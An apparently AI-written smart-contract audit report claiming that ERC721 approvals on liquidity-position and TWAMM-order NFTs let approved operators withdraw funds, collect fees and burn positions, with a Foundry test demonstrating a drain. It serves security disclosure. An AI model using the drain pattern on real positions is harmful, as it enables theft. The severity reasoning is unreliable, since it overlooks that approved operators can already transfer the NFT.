## Title
NFT Approval Grants Unauthorized Access to Drain Positions and Steal Fees

## Summary
The `authorizedForNft` modifier grants approved operators full access to position management functions (`deposit()`, `withdraw()`, `collectFees()`, `burn()`), not just NFT transfer rights. When users approve marketplaces for standard NFT listing/transfer operations, those marketplaces gain the ability to drain liquidity and steal fees from the underlying positions.

## Impact
**Severity**: High

## Finding Description
**Location:** 
- `src/base/BaseNonfungibleToken.sol` (authorizedForNft modifier)
- `src/base/BasePositions.sol` (deposit, withdraw, collectFees functions)
- `src/Orders.sol` (increaseSellAmount, decreaseSaleRate, collectProceeds functions)

**Intended Logic:** 
The `authorizedForNft` modifier is intended to restrict position management operations to the NFT owner or explicitly authorized operators. Users expect that when they approve a marketplace to transfer their NFT (e.g., listing on OpenSea), the approval only grants transfer permission. [1](#0-0) 

**Actual Logic:** 
The modifier uses `_isApprovedOrOwner(msg.sender, id)` from Solady's ERC721 implementation, which returns true for:
1. The token owner
2. Single-token approvals via `approve(operator, tokenId)`
3. Operator approvals via `setApprovalForAll(operator, true)`

This means **any ERC721 approval automatically grants full access to sensitive position management functions**: [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) 

The same vulnerability exists in the Orders contract: [6](#0-5) [7](#0-6) [8](#0-7) 

**Exploitation Path:**
1. Alice creates a liquidity position NFT with substantial liquidity (e.g., 100 ETH + 200,000 USDC)
2. Alice approves MaliciousMarketplace to transfer her NFT: `positions.approve(maliciousMarketplace, tokenId)`
3. MaliciousMarketplace calls `positions.withdraw(tokenId, poolKey, tickLower, tickUpper, liquidityAmount, maliciousMarketplace, true)` with `recipient = maliciousMarketplace`
4. All of Alice's liquidity and accumulated fees are transferred to MaliciousMarketplace
5. Alternatively, MaliciousMarketplace calls `positions.collectFees(tokenId, poolKey, tickLower, tickUpper, maliciousMarketplace)` to steal fees, or `burn(tokenId)` to destroy the position

**Security Property Broken:** 
This violates the fundamental security assumption that NFT approvals only grant transfer rights. It also enables direct theft of user funds, violating the protocol's solvency guarantees from the user's perspective.

## Impact Explanation
- **Affected Assets**: All liquidity positions (Positions contract) and TWAMM orders (Orders contract) where users have granted NFT approvals to third parties
- **Damage Severity**: Attacker can drain 100% of position liquidity and accumulated fees. For TWAMM orders, attackers can steal all order proceeds and cancel orders to redirect refunds
- **User Impact**: Any user who has approved a marketplace, lending protocol, or any third-party contract for NFT operations becomes vulnerable. This is a **standard user action** for listing NFTs on marketplaces like OpenSea, Blur, LooksRare, etc.

## Likelihood Explanation
- **Attacker Profile**: Any approved operator (marketplace, compromised marketplace, malicious contract pretending to be a marketplace)
- **Preconditions**: 
  - User must have a position with liquidity or accumulated fees
  - User must have granted approval via `approve()` or `setApprovalForAll()`
  - This is an **extremely common scenario** as users regularly approve marketplaces
- **Execution Complexity**: Single transaction calling `withdraw()` or `collectFees()` with attacker-controlled recipient address
- **Frequency**: Can be executed continuously for any approved position, across all users who have granted approvals

## Recommendation

Separate NFT transfer authorization from position management authorization by implementing a dedicated approval system for position operations:

```solidity
// In src/base/BaseNonfungibleToken.sol or BasePositions.sol:

// Add separate position operator approvals
mapping(uint256 => mapping(address => bool)) private _positionOperators;

// Event for position operator changes
event PositionOperatorSet(uint256 indexed tokenId, address indexed operator, bool approved);

// Function to set position operators (separate from NFT transfer approval)
function setPositionOperator(uint256 id, address operator, bool approved) external {
    require(ownerOf(id) == msg.sender, "Not token owner");
    _positionOperators[id][operator] = approved;
    emit PositionOperatorSet(id, operator, approved);
}

// Modified authorizedForNft modifier - only check owner OR position operator
modifier authorizedForNft(uint256 id) {
    address owner = ownerOf(id);
    if (msg.sender != owner && !_positionOperators[id][msg.sender]) {
        revert NotUnauthorizedForToken(msg.sender, id);
    }
    _;
}

// Override ERC721 _isApprovedOrOwner to prevent its use for position operations
// This ensures NFT approvals only affect transfers, not position management
```

**Alternative Mitigation**: If preserving ERC721 approval compatibility is critical, add an explicit allowlist pattern where users must separately authorize operators for position operations, independent of NFT transfer approvals.

## Proof of Concept

```solidity
// File: test/Exploit_ApprovalDrainsPosition.t.sol
// Run with: forge test --match-test test_ApprovalDrainsPosition -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import {FullTest} from "./FullTest.sol";
import {PoolKey} from "../src/types/poolKey.sol";

contract Exploit_ApprovalDrainsPosition is FullTest {
    address alice = makeAddr("alice");
    address maliciousMarketplace = makeAddr("maliciousMarketplace");
    
    function setUp() public override {
        super.setUp();
        
        // Give Alice tokens
        token0.transfer(alice, 1000 ether);
        token1.transfer(alice, 1000 ether);
    }
    
    function test_ApprovalDrainsPosition() public {
        // SETUP: Alice creates a position with liquidity
        PoolKey memory poolKey = createPool(0, 1 << 63, 100);
        
        vm.startPrank(alice);
        token0.approve(address(positions), 100 ether);
        token1.approve(address(positions), 100 ether);
        
        (uint256 tokenId, uint128 liquidity,,) = positions.mintAndDeposit(
            poolKey, 
            -100, 
            100, 
            100 ether, 
            100 ether, 
            0
        );
        
        // Alice lists her NFT on a marketplace (standard operation)
        // She calls approve() expecting only transfer permission
        positions.approve(maliciousMarketplace, tokenId);
        vm.stopPrank();
        
        // Verify Alice's position has liquidity
        (uint128 initialLiquidity,,,,) = positions.getPositionFeesAndLiquidity(
            tokenId, poolKey, -100, 100
        );
        assertGt(initialLiquidity, 0, "Alice should have liquidity");
        
        uint256 aliceBalanceBefore = token0.balanceOf(alice);
        uint256 attackerBalanceBefore = token0.balanceOf(maliciousMarketplace);
        
        // EXPLOIT: Malicious marketplace drains Alice's position
        vm.prank(maliciousMarketplace);
        (uint128 stolen0, uint128 stolen1) = positions.withdraw(
            tokenId,
            poolKey,
            -100,
            100,
            liquidity, // withdraw all liquidity
            maliciousMarketplace, // send funds to attacker
            true
        );
        
        // VERIFY: Funds stolen from Alice
        assertGt(stolen0, 0, "Attacker stole token0");
        assertGt(stolen1, 0, "Attacker stole token1");
        
        uint256 aliceBalanceAfter = token0.balanceOf(alice);
        uint256 attackerBalanceAfter = token0.balanceOf(maliciousMarketplace);
        
        // Alice's balance unchanged (funds went to attacker)
        assertEq(aliceBalanceAfter, aliceBalanceBefore, "Alice lost access to her funds");
        
        // Attacker received the funds
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker gained Alice's funds");
        
        // Position is now empty
        (uint128 finalLiquidity,,,,) = positions.getPositionFeesAndLiquidity(
            tokenId, poolKey, -100, 100
        );
        assertEq(finalLiquidity, 0, "Position completely drained");
        
        console.log("Vulnerability confirmed: Marketplace approval allowed draining position");
        console.log("Stolen token0:", stolen0);
        console.log("Stolen token1:", stolen1);
    }
}
```

This PoC demonstrates that a simple `approve()` call—the standard way to list an NFT on a marketplace—grants the marketplace full access to drain the position's liquidity. Users have no reason to expect this behavior, making it a critical security vulnerability.

**Notes:**
- This vulnerability affects both the Positions contract (liquidity positions) and Orders contract (TWAMM orders)
- The issue stems from reusing ERC721's approval mechanism for position management operations, when these should be separate authorization domains
- Users regularly approve marketplaces as a standard operation, making exploitation highly likely
- Even legitimate marketplaces become attack vectors if compromised or if they have bugs
- The vulnerability violates user expectations about what permissions an NFT approval grants

### Citations

**File:** src/base/BaseNonfungibleToken.sol (L78-86)
```text
    /// @notice Modifier to ensure the caller is authorized to perform actions on a specific token
    /// @dev Checks if the caller is the owner or approved for the token
    /// @param id The token ID to check authorization for
    modifier authorizedForNft(uint256 id) {
        if (!_isApprovedOrOwner(msg.sender, id)) {
            revert NotUnauthorizedForToken(msg.sender, id);
        }
        _;
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L128-135)
```text
    /// @inheritdoc IBaseNonfungibleToken
    /// @dev Can be used to refund some gas after the NFT is no longer needed.
    ///      The same ID can be recreated by the original minter by reusing the salt.
    ///      Only the token owner or approved addresses can burn the token.
    ///      No fees are collected; any msg.value sent is ignored.
    function burn(uint256 id) external payable authorizedForNft(id) {
        _burn(id);
    }
```

**File:** src/base/BasePositions.sol (L71-79)
```text
    function deposit(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 maxAmount0,
        uint128 maxAmount1,
        uint128 minLiquidity
    ) public payable authorizedForNft(id) returns (uint128 liquidity, uint128 amount0, uint128 amount1) {
```

**File:** src/base/BasePositions.sol (L100-107)
```text
    function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper)
        public
        payable
        authorizedForNft(id)
        returns (uint128 amount0, uint128 amount1)
    {
        (amount0, amount1) = collectFees(id, poolKey, tickLower, tickUpper, msg.sender);
    }
```

**File:** src/base/BasePositions.sol (L120-133)
```text
    function withdraw(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 liquidity,
        address recipient,
        bool withFees
    ) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
        (amount0, amount1) = abi.decode(
            lock(abi.encode(CALL_TYPE_WITHDRAW, id, poolKey, tickLower, tickUpper, liquidity, recipient, withFees)),
            (uint128, uint128)
        );
    }
```

**File:** src/Orders.sol (L53-74)
```text
    function increaseSellAmount(uint256 id, OrderKey memory orderKey, uint128 amount, uint112 maxSaleRate)
        public
        payable
        authorizedForNft(id)
        returns (uint112 saleRate)
    {
        uint256 realStart = FixedPointMathLib.max(block.timestamp, orderKey.config.startTime());

        unchecked {
            if (orderKey.config.endTime() <= realStart) {
                revert OrderAlreadyEnded();
            }

            saleRate = uint112(computeSaleRate(amount, uint32(orderKey.config.endTime() - realStart)));

            if (saleRate > maxSaleRate) {
                revert MaxSaleRateExceeded();
            }
        }

        lock(abi.encode(CALL_TYPE_CHANGE_SALE_RATE, msg.sender, id, orderKey, saleRate));
    }
```

**File:** src/Orders.sol (L77-95)
```text
    function decreaseSaleRate(uint256 id, OrderKey memory orderKey, uint112 saleRateDecrease, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint112 refund)
    {
        refund = uint112(
            uint256(
                -abi.decode(
                    lock(
                        abi.encode(
                            CALL_TYPE_CHANGE_SALE_RATE, recipient, id, orderKey, -int256(uint256(saleRateDecrease))
                        )
                    ),
                    (int256)
                )
            )
        );
    }
```

**File:** src/Orders.sol (L107-114)
```text
    function collectProceeds(uint256 id, OrderKey memory orderKey, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint128 proceeds)
    {
        proceeds = abi.decode(lock(abi.encode(CALL_TYPE_COLLECT_PROCEEDS, id, orderKey, recipient)), (uint128));
    }
```
